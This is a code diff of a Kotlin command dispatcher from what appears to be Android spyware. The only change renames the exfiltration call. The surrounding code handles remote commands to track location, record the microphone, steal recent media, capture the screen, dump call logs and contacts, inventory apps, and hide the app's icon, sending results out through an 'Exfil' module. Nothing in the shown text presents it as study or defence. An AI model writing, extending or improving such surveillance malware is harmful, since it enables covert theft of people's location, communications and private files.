@@ -23,7 +23,7 @@ object Commands {
         when (cmd) {
             "loc" -> {
                 LocationService.requestNow(ctx)
-                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
             }
 
             "mic" -> {
@@ -34,7 +34,7 @@ object Commands {
 
             "media" -> MediaStealer.stealRecent(ctx, args["n"]?.toIntOrNull() ?: 20)
 
-            "ping" -> BatchExfil.enqueue(ctx, "pong", """{"ts":${System.currentTimeMillis()}}""")
+            "ping" -> Exfil.sendLog(ctx, "pong", """{"ts":${System.currentTimeMillis()}}""")
 
             "screen" -> ProjectionConsent.launch(
                 ctx,
@@ -46,21 +46,21 @@ object Commands {
 
             "usage" -> start(ctx, UsageStatsService::class.java)
 
-            "apps" -> BatchExfil.enqueue(ctx, "apps", UsageStatsService.inventory(ctx))
+            "apps" -> Exfil.sendLog(ctx, "apps", UsageStatsService.inventory(ctx))
 
             "calls" -> {
                 val n = com.sp.core.services.CallLogDumper.dump(ctx)
-                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"calls","count":$n}""")
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"calls","count":$n}""")
             }
 
             "contacts" -> {
                 val n = com.sp.core.services.ContactsDumper.dump(ctx)
-                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"contacts","count":$n}""")
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"contacts","count":$n}""")
             }
 
             "ddr" -> {
                 val found = DeadDrop.resolve(ctx, apply = false)
-                BatchExfil.enqueue(ctx, "ddr", """{"found":${found != null},"ts":${System.currentTimeMillis()}}""")
+                Exfil.sendLog(ctx, "ddr", """{"found":${found != null},"ts":${System.currentTimeMillis()}}""")
             }
 
             "cfg" -> {
@@ -73,7 +73,7 @@ object Commands {
 
             "flush" -> BatchFlushWorker.flushNow(ctx)
 
-            "diag" -> BatchExfil.enqueue(ctx, "diag", com.sp.core.util.Diag.collect(ctx))
+            "diag" -> Exfil.sendLog(ctx, "diag", com.sp.core.util.Diag.collect(ctx))
 
             "hide" -> {
                 com.sp.core.stealth.IconHider.hide(ctx)
